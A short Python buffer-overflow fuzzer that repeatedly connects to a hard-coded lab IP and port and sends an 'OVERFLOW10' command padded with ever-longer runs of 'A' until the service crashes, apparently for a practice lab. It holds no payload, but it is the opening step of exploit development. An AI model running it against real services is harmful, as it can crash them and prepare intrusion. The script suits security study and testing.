#!/usr/bin/env python3

# python3 pfuzzer.py
# author: Omar Fayyad
#
# script fuzzes applications for overflow
# 
# run the script with no arguments. Make sure to change the IP address and port number and Prefix ( if any ).
#
# example: pfuzzer
#  result will show Fuzzing crashed at {} bytes
#----------------------------------------------------------------------------------

# import python3 modules needed for the script

import socket, time, sys

ip = "10.10.28.152"

port = 1337
timeout = 5
prefix = "OVERFLOW10 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
